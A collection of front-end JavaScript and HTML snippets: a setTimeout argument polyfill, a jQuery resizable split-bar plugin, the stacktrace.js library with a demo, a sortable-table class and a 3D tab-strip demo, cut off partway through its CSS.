				var func = window[name];
				window[name] = function(callback,delay) { //覆写函数
					//取出从第三个参数开始的参数
					var args = Array.prototype.slice.call(arguments, 2);
					args.length ? func(function() {
						callback.apply(null, args);
					}, delay) : func(callback, delay);
				};
			})(s[i]);
		})();
	};
	//测试
	setTimeout(function(a, b, c) {
		alert(a);
		alert(b);
		alert(c);
	}, 1000, 3.14, true, "test");
//-->
</script>

</head>
<body>

</body>
</html>

#T=split jsplit 分隔条
jsplit
 jQuery.noConflict();
 jQuery.fn.extend({
     jsplit: function (j) {
         return this.each(function () {
             j = j || {};
             j.Btn = j.Btn || {};
             j.Btn.oBg = j.Btn.oBg || {};
             j.Btn.cBg = j.Btn.cBg || {};
             var jun = { MaxW: "600px"
                         , MinW: "260px"
                         , FloatD: "left"
                         , IsClose: false
                         , BgUrl: ""
                         , Bg: "#fff"
                         , Btn: { btn: true
                                 , oBg: { Out: "#333", Hover: "orange" }
                                 , cBg: { Out: "#333", Hover: "orange"}
                         }
                 , Fn: function () { } 
             }
             j.MaxW = parseInt(j.MaxW) || parseInt(jun.MaxW);
             j.MinW = parseInt(j.MinW) || parseInt(jun.MinW);
             j.FloatD = j.FloatD || jun.FloatD;
             j.IsClose = j.IsClose != undefined ? j.IsClose : jun.IsClose;
             j.BgUrl = j.BgUrl || jun.BgUrl;
             j.Bg = j.Bg || jun.Bg;
             j.Btn.btn = j.Btn.btn != undefined ? j.Btn.btn : jun.Btn.btn;
             j.Btn.oBg.Out = j.Btn.oBg.Out || jun.Btn.oBg.Out;
             j.Btn.oBg.Hover = j.Btn.oBg.Hover || jun.Btn.oBg.Hover;
             j.Btn.cBg.Out = j.Btn.cBg.Out || jun.Btn.cBg.Out;
             j.Btn.cBg.Hover = j.Btn.cBg.Hover || jun.Btn.cBg.Hover;
             j.Fn = j.Fn || jun.Fn;
             var antiD = j.FloatD == "left" ? "right" : "left";
             if (j.MinW > j.MaxW) {
                 var amax = j.MaxW;
                 j.MaxW = j.MinW;
                 j.MinW = amax;
             };
             var _self = this;
             var Close = false;
             jQuery(_self).css({ position: "relative", float: j.FloatD, overflow: "hidden", padding: "0px" });
             jQuery(_self).wrapInner("<div class='jsplit-c' style='top:0px;z-index:9999;zoom:1;width:100%;overflow:hidden;position:relative;height:100%'></div>");
             jQuery(_self).children(".jsplit-c").append("<div class='jsplit-e' unselectable='on' style='background:#fff;height:100%;width:6px;top:0px;-moz-user-select:none;" + antiD + ":0px;position:absolute;cursor:e-resize;overflow:hidden;z-index:10000;'><div class='jsplit-e-handle'  unselectable='on'  style='height:40px;width:100%;top:50%;margin-top:-20px;left:0;position:absolute;cursor:pointer;-moz-user-select:none;'></div></div>");
             var dw = jQuery(_self).width();
             var jsplitc = jQuery(_self).children(".jsplit-c");
             var jsplite = jsplitc.children(".jsplit-e");
             var jsplith = jsplite.children(".jsplit-e-handle");
             if (j.Btn.btn == false) { jsplith.css({ display: "none" }) };
             if (jQuery.browser.msie) { document.execCommand("BackgroundImageCache", false, true); }
             if (dw > j.MaxW) { jQuery(_self).css({ width: j.MaxW }); }
             if (dw < j.MinW) { jQuery(_self).css({ width: j.MinW }); }
             jsplite.css({ background: j.Bg, "background-image": j.BgUrl, opacity: 0 })
             if (j.IsClose != false) {
                 jsplith.css({ background: j.Btn.cBg.Out, "background-image": j.BgUrl })
                 _selfclose();
             } else {
                 jsplith.css({ background: j.Btn.oBg.Out, "background-image": j.BgUrl })
             }
             jsplith.hover(function () {
                 if (Close == false) {
                     jQuery(this).css({ background: j.Btn.oBg.Hover, "background-image": j.BgUrl })
                 } else { jQuery(this).css({ background: j.Btn.cBg.Hover, "background-image": j.BgUrl }) }
             }, function () {
                 if (Close == false) {
                     jQuery(this).css({ background: j.Btn.oBg.Out, "background-image": j.BgUrl })
                 } else { jQuery(this).css({ background: j.Btn.cBg.Out, "background-image": j.BgUrl }) }
             })
             jQuery(_self).hover(function () { if (Close == false) jsplite.stop().animate({ opacity: 0.85 }, 200) }, function () { if (Close == false) jsplite.stop().animate({ opacity: 0 }, 2000) })
             jsplite.mousedown(function (e) {
                 j['Fn'] && j['Fn'].call(_self);
                 var screenX = e.screenX, w = jQuery(_self).width();
                 jQuery(document).mousemove(function (e2) {
                     curW = j.FloatD == "left" ? w + (e2.screenX - screenX) : w - (e2.screenX - screenX);
                     if (curW >= j.MaxW) { curW = j.MaxW; };
                     if (curW <= j.MinW) { curW = j.MinW; };
                     jQuery(_self).css({ width: curW });
                     dw = curW;
                 });
                 jQuery(document).mouseup(function () {
                     jQuery(document).unbind();
                 });
                 if (Close == true) {
                     jQuery(this).css({ cursor: "e-resize", opacity: 0.8 });
                     jQuery(_self).animate({ width: dw }, 200);
                     Close = false;
                 };
                 return false;
             });
             jsplite.dblclick(function () {
                 if (Close == false) {
                     _selfclose();
                 };
                 return false;
             });
             jsplith.click(function () {
                 if (Close == false) {
                     _selfclose();
                 };
                 return false;
             });
             function _selfclose() {
                 jsplite.css({ cursor: "pointer", opacity: 1 });
                 jsplith.css({ background: j.Btn.cBg.Out, "background-image": j.BgUrl });
                 jQuery(_self).animate({ width: "6px" }, 400);
                 Close = true;
             }
 
 
         });
     }
 });
#T=stacktrace.js
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
</head>
<body>
<!-- <script type="text/javascript" src="stacktrace.js"></script> -->
<script type="text/javascript">
<!--
	// Domain Public by Eric Wendelin http://eriwen.com/ (2008)
	//				  Luke Smith http://lucassmith.name/ (2008)
	//				  Loic Dachary <loic@dachary.org> (2008)
	//				  Johan Euphrosine <proppy@aminche.com> (2008)
	//				  Oyvind Sean Kinsey http://kinsey.no/blog (2010)
	//				  Victor Homyakov <victor-homyakov@users.sourceforge.net> (2010)
	/*global module, exports, define, ActiveXObject*/
	(function(global, factory) {
		if (typeof exports === 'object') {
			// Node
			module.exports = factory();
		} else if (typeof define === 'function' && define.amd) {
			// AMD
			define(factory);
		} else {
			// Browser globals
			global.printStackTrace = factory();
		}
	}(this, function() {
		/**
		 * Main function giving a function stack trace with a forced or passed in Error
		 *
		 * @cfg {Error} e The error to create a stacktrace from (optional)
		 * @cfg {Boolean} guess If we should try to resolve the names of anonymous functions
		 * @return {Array} of Strings with functions, lines, files, and arguments where possible
		 */
		function printStackTrace(options) {
			options = options || {guess: true};
			var ex = options.e || null, guess = !!options.guess;
			var p = new printStackTrace.implementation(), result = p.run(ex);
			return (guess) ? p.guessAnonymousFunctions(result) : result;
		}
		printStackTrace.implementation = function() {
		};
		printStackTrace.implementation.prototype = {
			/**
			 * @param {Error} ex The error to create a stacktrace from (optional)
			 * @param {String} mode Forced mode (optional, mostly for unit tests)
			 */
			run: function(ex, mode) {
				ex = ex || this.createException();
				// examine exception properties w/o debugger
				//for (var prop in ex) {alert("Ex['" + prop + "']=" + ex[prop]);}
				mode = mode || this.mode(ex);
				if (mode === 'other') {
					return this.other(arguments.callee);
				} else {
					return this[mode](ex);
				}
			},
			createException: function() {
				try {
					this.undef();
				} catch (e) {
					return e;
				}
			},
			/**
			 * Mode could differ for different exception, e.g.
			 * exceptions in Chrome may or may not have arguments or stack.
			 *
			 * @return {String} mode of operation for the exception
			 */
			mode: function(e) {
				if (e['arguments'] && e.stack) {
					return 'chrome';
				} else if (e.stack && e.sourceURL) {
					return 'safari';
				} else if (e.stack && e.number) {
					return 'ie';
				} else if (e.stack && e.fileName) {
					return 'firefox';
				} else if (e.message && e['opera#sourceloc']) {
					// e.message.indexOf("Backtrace:") > -1 -> opera9
					// 'opera#sourceloc' in e -> opera9, opera10a
					// !e.stacktrace -> opera9
					if (!e.stacktrace) {
						return 'opera9'; // use e.message
					}
					if (e.message.indexOf('\n') > -1 && e.message.split('\n').length > e.stacktrace.split('\n').length) {
						// e.message may have more stack entries than e.stacktrace
						return 'opera9'; // use e.message
					}
					return 'opera10a'; // use e.stacktrace
				} else if (e.message && e.stack && e.stacktrace) {
					// e.stacktrace && e.stack -> opera10b
					if (e.stacktrace.indexOf("called from line") < 0) {
						return 'opera10b'; // use e.stacktrace, format differs from 'opera10a'
					}
					// e.stacktrace && e.stack -> opera11
					return 'opera11'; // use e.stacktrace, format differs from 'opera10a', 'opera10b'
				} else if (e.stack && !e.fileName) {
					// Chrome 27 does not have e.arguments as earlier versions,
					// but still does not have e.fileName as Firefox
					return 'chrome';
				}
				return 'other';
			},
			/**
			 * Given a context, function name, and callback function, overwrite it so that it calls
			 * printStackTrace() first with a callback and then runs the rest of the body.
			 *
			 * @param {Object} context of execution (e.g. window)
			 * @param {String} functionName to instrument
			 * @param {Function} callback function to call with a stack trace on invocation
			 */
			instrumentFunction: function(context, functionName, callback) {
				context = context || window;
				var original = context[functionName];
				context[functionName] = function instrumented() {
					callback.call(this, printStackTrace().slice(4));
					return context[functionName]._instrumented.apply(this, arguments);
				};
				context[functionName]._instrumented = original;
			},
			/**
			 * Given a context and function name of a function that has been
			 * instrumented, revert the function to it's original (non-instrumented)
			 * state.
			 *
			 * @param {Object} context of execution (e.g. window)
			 * @param {String} functionName to de-instrument
			 */
			deinstrumentFunction: function(context, functionName) {
				if (context[functionName].constructor === Function &&
					context[functionName]._instrumented &&
					context[functionName]._instrumented.constructor === Function) {
					context[functionName] = context[functionName]._instrumented;
				}
			},
			/**
			 * Given an Error object, return a formatted Array based on Chrome's stack string.
			 *
			 * @param e - Error object to inspect
			 * @return Array<String> of function calls, files and line numbers
			 */
			chrome: function(e) {
				return (e.stack + '\n')
					.replace(/^[\s\S]+?\s+at\s+/, ' at ') // remove message
					.replace(/^\s+(at eval )?at\s+/gm, '') // remove 'at' and indentation
					.replace(/^([^\(]+?)([\n$])/gm, '{anonymous}() ($1)$2')
					.replace(/^Object.<anonymous>\s*\(([^\)]+)\)/gm, '{anonymous}() ($1)')
					.replace(/^(.+) \((.+)\)$/gm, '$1@$2')
					.split('\n')
					.slice(0, -1);
			},
			/**
			 * Given an Error object, return a formatted Array based on Safari's stack string.
			 *
			 * @param e - Error object to inspect
			 * @return Array<String> of function calls, files and line numbers
			 */
			safari: function(e) {
				return e.stack.replace(/\[native code\]\n/m, '')
					.replace(/^(?=\w+Error\:).*$\n/m, '')
					.replace(/^@/gm, '{anonymous}()@')
					.split('\n');
			},
			/**
			 * Given an Error object, return a formatted Array based on IE's stack string.
			 *
			 * @param e - Error object to inspect
			 * @return Array<String> of function calls, files and line numbers
			 */
			ie: function(e) {
				return e.stack
					.replace(/^\s*at\s+(.*)$/gm, '$1')
					.replace(/^Anonymous function\s+/gm, '{anonymous}() ')
					.replace(/^(.+)\s+\((.+)\)$/gm, '$1@$2')
					.split('\n')
					.slice(1);
			},
			/**
			 * Given an Error object, return a formatted Array based on Firefox's stack string.
			 *
			 * @param e - Error object to inspect
			 * @return Array<String> of function calls, files and line numbers
			 */
			firefox: function(e) {
				return e.stack.replace(/(?:\n@:0)?\s+$/m, '')
					.replace(/^(?:\((\S*)\))?@/gm, '{anonymous}($1)@')
					.split('\n');
			},
			opera11: function(e) {
				var ANON = '{anonymous}', lineRE = /^.*line (\d+), column (\d+)(?: in (.+))? in (\S+):$/;
				var lines = e.stacktrace.split('\n'), result = [];
				for (var i = 0, len = lines.length; i < len; i += 2) {
					var match = lineRE.exec(lines[i]);
					if (match) {
						var location = match[4] + ':' + match[1] + ':' + match[2];
						var fnName = match[3] || "global code";
						fnName = fnName.replace(/<anonymous function: (\S+)>/, "$1").replace(/<anonymous function>/, ANON);
						result.push(fnName + '@' + location + ' -- ' + lines[i + 1].replace(/^\s+/, ''));
					}
				}
				return result;
			},
			opera10b: function(e) {
				// "<anonymous function: run>([arguments not available])@file://localhost/G:/js/stacktrace.js:27\n" +
				// "printStackTrace([arguments not available])@file://localhost/G:/js/stacktrace.js:18\n" +
				// "@file://localhost/G:/js/test/functional/testcase1.html:15"
				var lineRE = /^(.*)@(.+):(\d+)$/;
				var lines = e.stacktrace.split('\n'), result = [];
				for (var i = 0, len = lines.length; i < len; i++) {
					var match = lineRE.exec(lines[i]);
					if (match) {
						var fnName = match[1] ? (match[1] + '()') : "global code";
						result.push(fnName + '@' + match[2] + ':' + match[3]);
					}
				}
				return result;
			},
			/**
			 * Given an Error object, return a formatted Array based on Opera 10's stacktrace string.
			 *
			 * @param e - Error object to inspect
			 * @return Array<String> of function calls, files and line numbers
			 */
			opera10a: function(e) {
				// "  Line 27 of linked script file://localhost/G:/js/stacktrace.js\n"
				// "  Line 11 of inline#1 script in file://localhost/G:/js/test/functional/testcase1.html: In function foo\n"
				var ANON = '{anonymous}', lineRE = /Line (\d+).*script (?:in )?(\S+)(?:: In function (\S+))?$/i;
				var lines = e.stacktrace.split('\n'), result = [];
				for (var i = 0, len = lines.length; i < len; i += 2) {
					var match = lineRE.exec(lines[i]);
					if (match) {
						var fnName = match[3] || ANON;
						result.push(fnName + '()@' + match[2] + ':' + match[1] + ' -- ' + lines[i + 1].replace(/^\s+/, ''));
					}
				}
				return result;
			},
			// Opera 7.x-9.2x only!
			opera9: function(e) {
				// "  Line 43 of linked script file://localhost/G:/js/stacktrace.js\n"
				// "  Line 7 of inline#1 script in file://localhost/G:/js/test/functional/testcase1.html\n"
				var ANON = '{anonymous}', lineRE = /Line (\d+).*script (?:in )?(\S+)/i;
				var lines = e.message.split('\n'), result = [];
				for (var i = 2, len = lines.length; i < len; i += 2) {
					var match = lineRE.exec(lines[i]);
					if (match) {
						result.push(ANON + '()@' + match[2] + ':' + match[1] + ' -- ' + lines[i + 1].replace(/^\s+/, ''));
					}
				}
				return result;
			},
			// Safari 5-, IE 9-, and others
			other: function(curr) {
				var ANON = '{anonymous}', fnRE = /function\s*([\w\-$]+)?\s*\(/i, stack = [], fn, args, maxStackSize = 10;
				while (curr && curr['arguments'] && stack.length < maxStackSize) {
					fn = fnRE.test(curr.toString()) ? RegExp.$1 || ANON : ANON;
					args = Array.prototype.slice.call(curr['arguments'] || []);
					stack[stack.length] = fn + '(' + this.stringifyArguments(args) + ')';
					curr = curr.caller;
				}
				return stack;
			},
			/**
			 * Given arguments array as a String, substituting type names for non-string types.
			 *
			 * @param {Arguments,Array} args
			 * @return {String} stringified arguments
			 */
			stringifyArguments: function(args) {
				var result = [];
				var slice = Array.prototype.slice;
				for (var i = 0; i < args.length; ++i) {
					var arg = args[i];
					if (arg === undefined) {
						result[i] = 'undefined';
					} else if (arg === null) {
						result[i] = 'null';
					} else if (arg.constructor) {
						if (arg.constructor === Array) {
							if (arg.length < 3) {
								result[i] = '[' + this.stringifyArguments(arg) + ']';
							} else {
								result[i] = '[' + this.stringifyArguments(slice.call(arg, 0, 1)) + '...' + this.stringifyArguments(slice.call(arg, -1)) + ']';
							}
						} else if (arg.constructor === Object) {
							result[i] = '#object';
						} else if (arg.constructor === Function) {
							result[i] = '#function';
						} else if (arg.constructor === String) {
							result[i] = '"' + arg + '"';
						} else if (arg.constructor === Number) {
							result[i] = arg;
						}
					}
				}
				return result.join(',');
			},
			sourceCache: {},
			/**
			 * @return the text from a given URL
			 */
			ajax: function(url) {
				var req = this.createXMLHTTPObject();
				if (req) {
					try {
						req.open('GET', url, false);
						//req.overrideMimeType('text/plain');
						//req.overrideMimeType('text/javascript');
						req.send(null);
						//return req.status == 200 ? req.responseText : '';
						return req.responseText;
					} catch (e) {
					}
				}
				return '';
			},
			/**
			 * Try XHR methods in order and store XHR factory.
			 *
			 * @return <Function> XHR function or equivalent
			 */
			createXMLHTTPObject: function() {
				var xmlhttp, XMLHttpFactories = [
					function() {
						return new XMLHttpRequest();
					}, function() {
						return new ActiveXObject('Msxml2.XMLHTTP');
					}, function() {
						return new ActiveXObject('Msxml3.XMLHTTP');
					}, function() {
						return new ActiveXObject('Microsoft.XMLHTTP');
					}
				];
				for (var i = 0; i < XMLHttpFactories.length; i++) {
					try {
						xmlhttp = XMLHttpFactories[i]();
						// Use memoization to cache the factory
						this.createXMLHTTPObject = XMLHttpFactories[i];
						return xmlhttp;
					} catch (e) {
					}
				}
			},
			/**
			 * Given a URL, check if it is in the same domain (so we can get the source
			 * via Ajax).
			 *
			 * @param url <String> source url
			 * @return <Boolean> False if we need a cross-domain request
			 */
			isSameDomain: function(url) {
				return typeof location !== "undefined" && url.indexOf(location.hostname) !== -1; // location may not be defined, e.g. when running from nodejs.
			},
			/**
			 * Get source code from given URL if in the same domain.
			 *
			 * @param url <String> JS source URL
			 * @return <Array> Array of source code lines
			 */
			getSource: function(url) {
				// TODO reuse source from script tags?
				if (!(url in this.sourceCache)) {
					this.sourceCache[url] = this.ajax(url).split('\n');
				}
				return this.sourceCache[url];
			},
			guessAnonymousFunctions: function(stack) {
				for (var i = 0; i < stack.length; ++i) {
					var reStack = /\{anonymous\}\(.*\)@(.*)/,
						reRef = /^(.*?)(?::(\d+))(?::(\d+))?(?: -- .+)?$/,
						frame = stack[i], ref = reStack.exec(frame);
					if (ref) {
						var m = reRef.exec(ref[1]);
						if (m) { // If falsey, we did not get any file/line information
							var file = m[1], lineno = m[2], charno = m[3] || 0;
							if (file && this.isSameDomain(file) && lineno) {
								var functionName = this.guessAnonymousFunction(file, lineno, charno);
								stack[i] = frame.replace('{anonymous}', functionName);
							}
						}
					}
				}
				return stack;
			},
			guessAnonymousFunction: function(url, lineNo, charNo) {
				var ret;
				try {
					ret = this.findFunctionName(this.getSource(url), lineNo);
				} catch (e) {
					ret = 'getSource failed with url: ' + url + ', exception: ' + e.toString();
				}
				return ret;
			},
			findFunctionName: function(source, lineNo) {
				// FIXME findFunctionName fails for compressed source
				// (more than one function on the same line)
				// function {name}({args}) m[1]=name m[2]=args
				var reFunctionDeclaration = /function\s+([^(]*?)\s*\(([^)]*)\)/;
				// {name} = function ({args}) TODO args capture
				// /['"]?([0-9A-Za-z_]+)['"]?\s*[:=]\s*function(?:[^(]*)/
				var reFunctionExpression = /['"]?([$_A-Za-z][$_A-Za-z0-9]*)['"]?\s*[:=]\s*function\b/;
				// {name} = eval()
				var reFunctionEvaluation = /['"]?([$_A-Za-z][$_A-Za-z0-9]*)['"]?\s*[:=]\s*(?:eval|new Function)\b/;
				// Walk backwards in the source lines until we find
				// the line which matches one of the patterns above
				var code = "", line, maxLines = Math.min(lineNo, 20), m, commentPos;
				for (var i = 0; i < maxLines; ++i) {
					// lineNo is 1-based, source[] is 0-based
					line = source[lineNo - i - 1];
					commentPos = line.indexOf('//');
					if (commentPos >= 0) {
						line = line.substr(0, commentPos);
					}
					// TODO check other types of comments? Commented code may lead to false positive
					if (line) {
						code = line + code;
						m = reFunctionExpression.exec(code);
						if (m && m[1]) {
							return m[1];
						}
						m = reFunctionDeclaration.exec(code);
						if (m && m[1]) {
							//return m[1] + "(" + (m[2] || "") + ")";
							return m[1];
						}
						m = reFunctionEvaluation.exec(code);
						if (m && m[1]) {
							return m[1];
						}
					}
				}
				return '(?)';
			}
		};
		return printStackTrace;
	}));
//-->
</script>
<script type="text/javascript">
<!--
	var s = '';
	function foo() {
		var blah;
		bar('blah');
	}
	function bar(blah) {
		// some code
		thing();
	}
	function thing() {
		if (true) { //your error condition here
			alert("1");
			var trace = printStackTrace();
			s = trace.join('\n\n');
		}
	}
	var f = foo;
	f();
	alert(s);
//-->
</script>
</body>
</html>

#T=Table 排序
<!doctype html>
<html lang="en">
 <head>
  <meta charset="UTF-8">
  
  <title>Document</title>
  <link href="css/brix.css" rel="stylesheet"/>
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <style>
    .wrap{
        width: 500px;
        margin: 20px auto;
    }
    .table {
      width: 100%;
    }
    .table th {
      font-weight: bold;
    }

    .table th, .table td {
      padding: 10px;
      vertical-align: top;
      text-align: center;
    }
    .table tbody th, .table tbody td {
      border-top: 1px solid #ccc;
    }
    .table .sortable {
      cursor: pointer;
    }
    .table .st-active {
      background: #f60;
      color: #fff;
    }
</style>
<script type="text/javascript">
<!--
	
/**
 * JS对表格排序(支持按序号,日期，字母，数字排序)。
 * @constructor {KSortTable} 
 * @date 2013-12-26
 * @author tugenhua
 * @email 879083421@qq.com
 */

 function KSortTable(options) {
	
	this.config = {
		tableElem              :  '.J_table',       //表格容器
		sortableElem           :  '.sortable',      // 点击对象
		callback               :  null              // 排序好后的回调函数
	};

	this.cache = {
		trArrs       : []             // 存放tbody下的所有tr
	};

	this.init(options);
 }

 KSortTable.prototype = {
	constructor : KSortTable,
	init: function(options){
		this.config = $.extend(this.config,options || {});
		var self = this,
			_config = self.config,
			_cache = self.cache;
		
		$(_config.sortableElem).each(function(index,item){
			
			$(item).unbind('click');
			$(item).bind('click',function(e){
				var tagParent = $(this).closest(_config.tableElem),
					tagAttr = $(this).attr("data-sorttable");

				// 判断table元素是否有属性 data-sorttable = 'true' 没有的话 不做任何事情
				if($(tagParent).attr('data-sorttable') == 'true') {
					self._curStyle($(this));
					var index = $(_config.sortableElem,tagParent).index($(this));
				
					// 排序函数
					self._sortMethod(index,tagAttr,tagParent,$(this));
				}
			});
		});
	},
	/*
	 * 点击对当前添加样式
	 */
	_curStyle: function(item) {
		var self = this;
		!$(item).hasClass('st-active') && $(item).addClass("st-active").siblings().removeClass("st-active");
		if(!$(item).hasClass('data-reverse')) {
			$(item).addClass('data-reverse');
		}else {
			$(item).removeClass('data-reverse');
		}
	},
	/*
	 * 排序方法 做了type的判断 
	 * 目前暂支持 数字 字符串 日期的比较
	 */
	_sortMethod: function(index,tagAttr,tagParent,tagElem) {
		var self = this,
			_config = self.config,
			_cache = self.cache;

		var tbody = $(tagParent)[0].tBodies[0];
		for(var i = 0, ilen = tbody.rows.length; i < ilen; i++) {
			_cache.trArrs[i] = tbody.rows[i];
		}
		if(tagAttr == 'number') {
			_cache.trArrs.sort(function (td1, td2){
				if($(tagElem).hasClass('data-reverse')) {
					return td1.cells[index].innerHTML - td2.cells[index].innerHTML;
				}else {
					return td2.cells[index].innerHTML - td1.cells[index].innerHTML
				}
			});
		}else if(tagAttr == 'string') {
			_cache.trArrs.sort(function(td1,td2){
				var str1 = td1.cells[index].innerHTML,
					str2 = td2.cells[index].innerHTML;

				if($(tagElem).hasClass('data-reverse')) {
					return str1.localeCompare(str2);
				}else {
					return str2.localeCompare(str1);
				}	
			});
		}else if(tagAttr == 'date') {
			_cache.trArrs.sort(function (td1, td2){
				var str1 = td1.cells[index].innerHTML,
					str2 = td2.cells[index].innerHTML;
				
				if($(tagElem).hasClass('data-reverse')) {
					return Date.parse(str1.replace(/-/g,'/')) - Date.parse(str2.replace(/-/g,'/'));
				}else {
					return Date.parse(str2.replace(/-/g,'/')) - Date.parse(str1.replace(/-/g,'/'));
				}
			});	
		}

		//把排序后的tr 重新插入tbody
		for(var j =0; j < _cache.trArrs.length; j++ ) {
			tbody.appendChild(_cache.trArrs[j]);
		}
		// 排序完 回调
		_config.callback && $.isFunction(_config.callback) && _config.callback();
	}
 };

/* JS初始化 */
$(function(){
	new KSortTable({});
});

//-->
</script>
 </head>
 <body>
	<div class="wrap">
	<table class="table J_table" data-sorttable="true">
		<thead>
			<tr>
				<th class="sortable" data-sorttable = 'number'>序号</th>
				<th class="sortable" data-sorttable = 'string'>字母</th>
				<th class="sortable" data-sorttable = 'number'>数字</th>
				<th class="sortable" data-sorttable = 'date'>日期</th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td>01</td>
				<td>abcd</td>
				<td>56</td>
				<td>2013-12-11</td>
			</tr>
			<tr>
				<td>02</td>
				<td>vscd</td>
				<td>11</td>
				<td>2013-12-12</td>
			</tr>
			<tr>
				<td>03</td>
				<td>bcda</td>
				<td>08</td>
				<td>2013-12-13</td>
			</tr>
			<tr>
				<td>04</td>
				<td>cdab</td>
				<td>01</td>
				<td>2013-12-14</td>
			</tr>
			<tr>
				<td>05</td>
				<td>qzrabtgdf</td>
				<td>04</td>
				<td>2013-12-15</td>
			</tr>
			<tr>
				<td>06</td>
				<td>abcddsgf</td>
				<td>06</td>
				<td>2013-12-16</td>
			</tr>
			<tr>
				<td>47</td>
				<td>vscdrte</td>
				<td>02</td>
				<td>2013-12-17</td>

			</tr>
			<tr>
				<td>08</td>
				<td>bcdae</td>
				<td>08</td>
				<td>2013-12-18</td>

			</tr>
			<tr>
				<td>29</td>
				<td>cdaber</td>
				<td>01</td>
				<td>2013-12-19</td>
			</tr>
			<tr>
				<td>10</td>
				<td>zrab</td>
				<td>04</td>
				<td>2013-12-20</td>
			</tr>
		</tbody>
	</table>
 </body>
</html>

#T=TabStrip 3D
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>3D TabStrip Demo</title>
	<script language='javascript' type='text/javascript'>
// =====================================================================
// Runs when TabStrip page is first loaded
// =====================================================================
function initializeTabStripPage()
{
	// Private vars
	divHeight = 0;
	divWidth = 0;
	maxDivWidth = 0;
	maxDivHeight = 0;
	tabButtonTotWidth = 3;

	// ----------------------------------------------------------
	// TabStrip repaint needs border-collapse in IE only
	htmlTable = document.getElementById("tabsTable");
	browserName = navigator.appName.toUpperCase();
	if (browserName.substring(0, 9) == "MICROSOFT")
		htmlTable.style.borderCollapse = "collapse";

	// Make the Tabstrip tab body visible
	tabbody = document.getElementById("tabBody");
	tabbody.style.visibility = 'visible';

	// Set numTabs and TabBody colSpan
	tabtops = document.getElementById("tabTops");
	tdCount = tabtops.getElementsByTagName("td").length;
	numTabs = tdCount / 2;
	tabbody.colSpan = tdCount + 1; 
	
	// ----------------------------------------------------------		
	// Position the <DIV>s that contain the Tab controls
	for (var i=1; i<=numTabs; i++)
	{			
		// Set properties of the <DIV> that contain the Tab controls
		tab = document.getElementById("tab" + i);
		tab.style.position = "absolute";
		tab.style.visibility = 'hidden';
		
		// ** NOTE - Comment this line out to see the <div> on the Tab
		tab.style.borderWidth = 0;

		// Position the <DIV> on the Tab <TABLE>
		tab.style.top = (document.getElementById("tabsTable").offsetTop + 38) + "px";
		tab.style.left = 18 + "px";

		// Set maximum <DIV> height if its tallest
		divHeight = parseInt(tab.style.height);
		if (divHeight > maxDivHeight)
			maxDivHeight = divHeight;				
		
		// Set maximum <DIV> width if its widest
		divWidth = parseInt(tab.style.width);			
		if (divWidth > maxDivWidth)
			maxDivWidth = divWidth;
		
		// Add to total width of all Tab buttons
		tabButton = document.getElementById(i);
		tabButtonTotWidth += parseInt(tabButton.style.width) + 16;
	}
	
	// Set tab body height and tab button right filler width
	tabbody.style.height = (maxDivHeight + 18) + "px";
	tabbuttons = document.getElementById("tabButtons");	
	rightfiller = tabbuttons.getElementsByTagName("td")[tdCount];
	rightfiller.style.width = (maxDivWidth - tabButtonTotWidth) + "px";
		
	// Show the controls on the last Tab selected by the user
	prevTabNum = document.getElementById("hidCurrentTab").value;
	showTab(prevTabNum);
}

// ========================================================================
// TabStrip changing function - Uses seperate page <DIV>ision for each Tab 
// ========================================================================
function showTab(tabNum)
{
	// Hide last selected Tab <DIV> and show current <DIV>
	prevTabNum = document.getElementById("hidCurrentTab").value;
	document.getElementById("tab" + prevTabNum).style.visibility = 'hidden';
	document.getElementById("tab" + tabNum).style.visibility = 'visible';

	// Put currently selected Tab number (to be shown) in hidden textbox
	document.getElementById("hidCurrentTab").value = tabNum;

	// ------------------------------------------------------
	// Make the last selected Tab button label "jump back"
	prevTab = document.getElementById(prevTabNum);
	prevTab.style.borderWidth = "1px";
	prevTab.style.borderBottomWidth = "2px";
	prevTab.style.borderColor = '#ffffff';
	prevTab.style.borderRightColor = '#000000';
	prevTab.style.paddingTop = "5px";
	document.getElementById("tabtop" + prevTabNum).style.borderWidth = "0px";	

	// ------------------------------------------------------
	// Make the currently selected Tab button label "jump forward"
	currTab = document.getElementById(tabNum);
	currTab.style.borderWidth = "2px";	
	currTab.style.borderTopWidth = "0px";	
	currTab.style.borderColor = '#ffffff';
	currTab.style.borderRightColor = '#000000';
	currTab.style.borderBottomColor = '#d4d0c8';
	currTab.style.paddingTop = "0px";

	tabTop = document.getElementById("tabtop" + tabNum);
	tabTop.style.borderWidth = "2px";	
	tabTop.style.borderBottomWidth = "0px";
	tabTop.style.borderColor = '#ffffff';
	tabTop.style.borderRightColor = '#000000';
	tabTop.style.borderBottomColor = '#d4d0c8';
	
	// ------------------------------------------------------
	// Show or hide the left hand Tab button filler <TD> 
	leftfiller = document.getElementById("leftFiller");
	if (tabNum == 1)
	{
		// Tab 1 selected - So merge left filler with Tab1
		document.getElementById(1).style.borderLeftWidth = "0px";
		leftfiller.style.borderWidth = "2px";
		leftfiller.style.borderRightWidth = "0px";
		leftfiller.style.borderTopWidth = "0px";
		leftfiller.style.borderBottomColor = '#d4d0c8';
	}
	else
	{
		// Tab 1 NOT selected - So HIDE left filler border
		leftfiller.style.borderWidth = "0px";
		leftfiller.style.borderBottomWidth = "2px";
		leftfiller.style.borderBottomColor = '#ffffff';
	}
}
	</script>
	
<style>
.tabTable
{
	border-spacing: 0px;
	border-width: 0px;
	margin-left: 10px;
	margin-top: 5px;
	margin-right: auto; 
	position: relative;
	background-color: #d4d0c8;
	table-layout: inherit;
}

.tabTopFiller
{
	border-style: solid;
	border-width: 0px;
	padding: 0px;
}

.tabLeftFiller
{
	border-style: solid;
	border-width: 0px;
	border-left-color: #ffffff;
	border-bottom-color: #d4d0c8;
}

.tabRightFiller
{
	border-bottom-style: solid;
	border-bottom-width: 2px;
	border-bottom-color: #ffffff;
	padding: 0px;
}

.tabButton
{
	border-style: solid;
	border-width: 1px;
	border-bottom-width: 2px;
